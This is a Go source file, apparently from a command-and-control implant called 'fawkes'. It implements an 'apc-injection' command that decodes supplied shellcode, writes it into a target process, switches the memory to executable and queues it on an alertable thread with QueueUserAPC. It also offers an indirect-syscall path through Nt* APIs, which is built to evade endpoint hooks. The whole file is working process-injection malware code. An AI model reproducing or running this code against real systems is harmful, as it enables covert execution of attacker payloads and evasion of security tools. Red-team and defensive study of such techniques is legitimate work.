//go:build windows
// +build windows

// Package commands provides the apc-injection command for QueueUserAPC-based process injection.
//
// When indirect syscalls are active, uses Nt* APIs via indirect stubs:
// NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory,
// NtOpenThread, NtQueueApcThread, NtResumeThread
//
// Requirements:
// - Target thread must be in an alertable wait state (Suspended or DelayExecution)
// - Use the 'ts' command to identify alertable threads before injection
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"
)

// Thread access rights for APC injection
const (
	THREAD_SET_CONTEXT    = 0x0010
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SUSPEND_RESUME = 0x0002
	THREAD_TERMINATE      = 0x0001
	THREAD_ALL_ACCESS     = 0x001F03FF
)

// Windows API procedures for APC injection
var (
	procOpenThread      = kernel32.NewProc("OpenThread")
	procQueueUserAPC    = kernel32.NewProc("QueueUserAPC")
	procResumeThread    = kernel32.NewProc("ResumeThread")
	procGetThreadId     = kernel32.NewProc("GetThreadId")
	procVirtualProtectX = kernel32.NewProc("VirtualProtectEx")
)

// ApcInjectionCommand implements the apc-injection command
type ApcInjectionCommand struct{}

// Name returns the command name
func (c *ApcInjectionCommand) Name() string {
	return "apc-injection"
}

// Description returns the command description
func (c *ApcInjectionCommand) Description() string {
	return "Perform QueueUserAPC injection into an alertable thread"
}

// ApcInjectionParams represents the parameters for apc-injection
type ApcInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
	TID          int    `json:"tid"`           // Target thread ID
}

// Execute executes the apc-injection command
func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params ApcInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	if params.TID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid Thread ID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := performApcInjection(shellcode, params.PID, params.TID)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// performApcInjection dispatches to indirect or standard APC injection
func performApcInjection(shellcode []byte, pid int, tid int) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] APC Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d, TID: %d\n", pid, tid))

	// Check thread state and warn if not alertable
	threadState := getThreadWaitReason(uint32(tid))
	sb.WriteString(fmt.Sprintf("[*] Target thread state: %s\n", threadState))

	if threadState != "Suspended" && threadState != "DelayExecution" &&
		threadState != "WrSuspended" && threadState != "WrDelayExecution" {
		sb.WriteString(fmt.Sprintf("[!] WARNING: Thread is not in an alertable state (%s)\n", threadState))
		sb.WriteString("[!] APC may not execute until thread enters an alertable wait\n")
	}

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
		return apcIndirect(&sb, shellcode, pid, tid, threadState)
	}
	return apcStandard(&sb, shellcode, pid, tid, threadState)
}

// apcStandard uses Win32 APIs with W^X memory pattern
func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadState string) (string, error) {
	// Step 1: Open process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	hProcess, _, err := procOpenProcess.Call(
		uintptr(desiredAccess), 0, uintptr(pid))
	if hProcess == 0 {
		return sb.String(), fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer procCloseHandle.Call(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// Step 2: Allocate RW memory (W^X: write first, protect later)
	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProcess, 0, uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE))
	if remoteAddr == 0 {
		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at: 0x%X\n", remoteAddr))

	// Step 3: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProcess, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)))
	if ret == 0 {
		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten))

	// Step 4: Change to RX (W^X enforcement)
	var oldProtect uint32
	ret, _, err = procVirtualProtectX.Call(
		hProcess, remoteAddr, uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", err)
	}
	sb.WriteString("[+] Changed memory protection to RX\n")

	// Step 5: Open thread
	hThread, _, err := procOpenThread.Call(
		uintptr(THREAD_ALL_ACCESS), 0, uintptr(tid))
	if hThread == 0 {
		return sb.String(), fmt.Errorf("OpenThread failed: %v", err)
	}
	defer procCloseHandle.Call(hThread)
	sb.WriteString(fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread))

	// Step 6: Queue APC
	ret, _, err = procQueueUserAPC.Call(remoteAddr, hThread, 0)
	if ret == 0 {
		return sb.String(), fmt.Errorf("QueueUserAPC failed: %v", err)
	}
	sb.WriteString("[+] APC queued successfully\n")

	// Step 7: Resume if suspended
	apcResumeThread(sb, hThread, threadState, false)

	sb.WriteString("[+] APC injection completed successfully\n")
	return sb.String(), nil
}

// apcIndirect uses Nt* APIs via indirect syscall stubs
func apcIndirect(sb *strings.Builder, shellcode []byte, pid, tid int, threadState string) (string, error) {
	// Step 1: NtOpenProcess
	var hProcess uintptr
	status := IndirectNtOpenProcess(&hProcess, uint32(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|
		PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ), uintptr(pid))
	if status != 0 {
		return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hProcess)
	sb.WriteString(fmt.Sprintf("[+] NtOpenProcess: 0x%X\n", hProcess))

	// Step 2: NtAllocateVirtualMemory (RW)
	var remoteAddr uintptr
	regionSize := uintptr(len(shellcode))
	status = IndirectNtAllocateVirtualMemory(hProcess, &remoteAddr, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] NtAllocateVirtualMemory: 0x%X (RW)\n", remoteAddr))

	// Step 3: NtWriteVirtualMemory
	var bytesWritten uintptr
	status = IndirectNtWriteVirtualMemory(hProcess, remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] NtWriteVirtualMemory: %d bytes\n", bytesWritten))

	// Step 4: NtProtectVirtualMemory (RW → RX)
	protectAddr := remoteAddr
	protectSize := uintptr(len(shellcode))
	var oldProtect uint32
	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
		PAGE_EXECUTE_READ, &oldProtect)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] NtProtectVirtualMemory: RW → RX\n")

	// Step 5: NtOpenThread
	var hThread uintptr
	status = IndirectNtOpenThread(&hThread, THREAD_ALL_ACCESS, uintptr(tid))
	if status != 0 {
		return sb.String(), fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hThread)
	sb.WriteString(fmt.Sprintf("[+] NtOpenThread: 0x%X\n", hThread))

	// Step 6: NtQueueApcThread
	status = IndirectNtQueueApcThread(hThread, remoteAddr, 0, 0, 0)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] NtQueueApcThread: APC queued\n")

	// Step 7: Resume if suspended
	apcResumeThread(sb, hThread, threadState, true)

	sb.WriteString("[+] APC injection completed successfully (indirect syscalls)\n")
	return sb.String(), nil
}

// apcResumeThread resumes a suspended thread using either indirect or standard API
func apcResumeThread(sb *strings.Builder, hThread uintptr, threadState string, indirect bool) {
	if threadState != "Suspended" && threadState != "WrSuspended" {
		sb.WriteString("[*] Thread not suspended, APC will execute when thread enters alertable wait\n")
		return
	}

	sb.WriteString("[*] Thread is suspended, resuming...\n")
	if indirect {
		var prevCount uint32
		status := IndirectNtResumeThread(hThread, &prevCount)
		if status != 0 {
			sb.WriteString(fmt.Sprintf("[!] NtResumeThread failed: NTSTATUS 0x%X\n", status))
			return
		}
		sb.WriteString(fmt.Sprintf("[+] NtResumeThread: previous suspend count: %d\n", prevCount))
	} else {
		prevCount, _, _ := procResumeThread.Call(hThread)
		if int32(prevCount) == -1 {
			sb.WriteString("[!] ResumeThread failed\n")
			return
		}
		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
	}
}

// getThreadWaitReason returns the wait reason for a thread
func getThreadWaitReason(tid uint32) string {
	var bufferSize uint32 = 1024 * 1024
	var buffer []byte
	var returnLength uint32

	for {
		buffer = make([]byte, bufferSize)
		ret, _, _ := procNtQuerySystemInformation.Call(
			uintptr(SystemProcessInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if ret == 0xC0000004 { // STATUS_INFO_LENGTH_MISMATCH
			bufferSize = returnLength + 65536
			continue
		}

		if ret != 0 {
			return "Unknown"
		}
		break
	}

	offset := uint32(0)
	for {
		if offset >= uint32(len(buffer)) {
			break
		}

		procInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		threadOffset := offset + uint32(unsafe.Sizeof(SYSTEM_PROCESS_INFORMATION{}))

		for i := uint32(0); i < procInfo.NumberOfThreads; i++ {
			if threadOffset >= uint32(len(buffer)) {
				break
			}

			threadInfo := (*SYSTEM_THREAD_INFORMATION)(unsafe.Pointer(&buffer[threadOffset]))

			if uint32(threadInfo.ClientId.UniqueThread) == tid {
				return getWaitReasonString(threadInfo.WaitReason)
			}

			threadOffset += uint32(unsafe.Sizeof(SYSTEM_THREAD_INFORMATION{}))
		}

		if procInfo.NextEntryOffset == 0 {
			break
		}
		offset += procInfo.NextEntryOffset
	}

	return "Unknown"
}
